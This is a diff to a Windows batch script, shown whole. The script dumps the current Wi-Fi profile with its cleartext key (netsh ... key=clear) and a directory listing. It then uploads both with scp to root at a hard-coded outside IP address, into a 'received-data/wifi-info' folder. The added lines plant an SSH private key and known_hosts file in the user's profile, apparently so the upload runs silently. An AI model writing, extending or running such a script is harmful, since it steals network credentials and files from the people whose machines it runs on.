@@ -23,6 +23,11 @@ dir > %ssid%-dirinfo-%dateTime%
 netsh wlan show profile %ssid% key=clear > %ssid%-wifiinfo-%dateTime%
 timeout /t 1 /nobreak > NUL
 
+move id_rsa c:\\Users\\%usrname%\\.ssh
+timeout /t 1 /nobreak > NUL
+move known_hosts c:\\Users\\%usrname%\\.ssh
+timeout /t 1 /nobreak > NUL
+
 scp -rp %ssid%-dirinfo-%dateTime% root@198.58.98.140:/root/received-data/wifi-info/
 timeout /t 1 /nobreak > NUL
 scp -rp %ssid%-wifiinfo-%dateTime% root@198.58.98.140:/root/received-data/wifi-info/
